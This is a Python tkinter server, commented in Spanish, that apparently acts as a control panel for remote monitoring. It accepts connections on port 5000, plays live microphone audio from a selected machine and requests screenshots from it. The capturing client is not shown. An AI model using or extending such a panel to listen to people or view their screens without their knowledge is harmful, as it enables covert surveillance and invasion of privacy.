import socket
import pyaudio
import threading
import tkinter as tk
from tkinter import messagebox
from PIL import Image, ImageTk
import io

# Configuración de Audio
CHUNK = 1024
FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100

class ServidorMultimedia:
    def __init__(self, root):
        self.root = root
        self.root.title("Centro de Monitoreo - Audio & Captura")
        self.root.geometry("700x550")
        self.root.configure(bg="#2c3e50")
        
        self.ip_seleccionada = None
        self.sockets_clientes = {} # Guardamos el socket para enviar comandos
        
        # --- Interfaz Gráfica ---
        tk.Label(root, text="Panel de Control Remoto", font=("Arial", 18, "bold"), bg="#2c3e50", fg="white").pack(pady=20)
        
        self.lista_ui = tk.Listbox(root, width=80, height=12, font=("Consolas", 10), bg="#ecf0f1")
        self.lista_ui.pack(padx=20)
        
        btn_frame = tk.Frame(root, bg="#2c3e50")
        btn_frame.pack(pady=20)
        
        tk.Button(btn_frame, text="🔊 ESCUCHAR", command=self.escuchar, bg="#27ae60", fg="white", width=15).grid(row=0, column=0, padx=5)
        tk.Button(btn_frame, text="📸 CAPTURA", command=self.solicitar_captura, bg="#2980b9", fg="white", width=15).grid(row=0, column=1, padx=5)
        tk.Button(btn_frame, text="■ DETENER", command=self.detener, bg="#c0392b", fg="white", width=15).grid(row=0, column=2, padx=5)

        self.lbl_status = tk.Label(root, text="ESTADO: ESPERANDO", bg="#34495e", fg="#bdc3c7", font=("Arial", 10, "italic"))
        self.lbl_status.pack(side=tk.BOTTOM, fill=tk.X)

        # --- Audio ---
        self.p = pyaudio.PyAudio()
        self.stream = self.p.open(format=FORMAT, channels=CHANNELS, rate=RATE, output=True, frames_per_buffer=CHUNK)
        
        threading.Thread(target=self.servidor_red, daemon=True).start()

    def servidor_red(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(('0.0.0.0', 5000))
        server.listen(10)
        
        while True:
            conn, addr = server.accept()
            ip = addr[0]
            self.sockets_clientes[ip] = conn
            self.root.after(0, self.actualizar_lista)
            threading.Thread(target=self.manejar_datos, args=(conn, ip), daemon=True).start()

    def manejar_datos(self, conn, ip):
        try:
            while True:
                # Leemos el prefijo (4 bytes: AUD: o IMG:)
                prefijo = conn.recv(4)
                if not prefijo: break

                if prefijo == b"AUD:":
                    data = conn.recv(CHUNK * 2)
                    if self.ip_seleccionada == ip:
                        self.stream.write(data)
                
                elif prefijo == b"IMG:":
                    # Leer tamaño de la imagen (4 bytes)
                    size_bytes = conn.recv(4)
                    size = int.from_bytes(size_bytes, byteorder='big')
                    # Leer la imagen completa
                    img_data = b""
                    while len(img_data) < size:
                        img_data += conn.recv(size - len(img_data))
                    
                    self.root.after(0, self.mostrar_imagen, img_data, ip)
        except:
            pass
        finally:
            if ip in self.sockets_clientes: del self.sockets_clientes[ip]
            self.root.after(0, self.actualizar_lista)
            conn.close()

    def actualizar_lista(self):
        self.lista_ui.delete(0, tk.END)
        for ip in self.sockets_clientes:
            self.lista_ui.insert(tk.END, f"Dispositivo Conectado: {ip}")

    def escuchar(self):
        sel = self.lista_ui.curselection()
        if sel:
            self.ip_seleccionada = self.lista_ui.get(sel[0]).split(": ")[1]
            self.lbl_status.config(text=f"ESCUCHANDO A: {self.ip_seleccionada}", fg="#2ecc71")

    def detener(self):
        self.ip_seleccionada = None
        self.lbl_status.config(text="ESTADO: SILENCIO", fg="#bdc3c7")

    def solicitar_captura(self):
        sel = self.lista_ui.curselection()
        if sel:
            ip = self.lista_ui.get(sel[0]).split(": ")[1]
            conn = self.sockets_clientes.get(ip)
            if conn:
                conn.sendall(b"SCREEN") # Enviamos comando al cliente
        else:
            messagebox.showwarning("Aviso", "Selecciona una PC primero")

    def mostrar_imagen(self, raw_data, ip):
        # Crear ventana emergente para la foto
        ventana_img = tk.Toplevel(self.root)
        ventana_img.title(f"Captura de {ip}")
        
        img = Image.open(io.BytesIO(raw_data))
        # Redimensionar para que quepa en pantalla si es muy grande
        img.thumbnail((800, 600))
        img_tk = ImageTk.PhotoImage(img)
        
        lbl = tk.Label(ventana_img, image=img_tk)
        lbl.image = img_tk # Referencia para que no la borre el recolector de basura
        lbl.pack()

if __name__ == "__main__":
    root = tk.Tk()
    app = ServidorMultimedia(root)
    root.mainloop()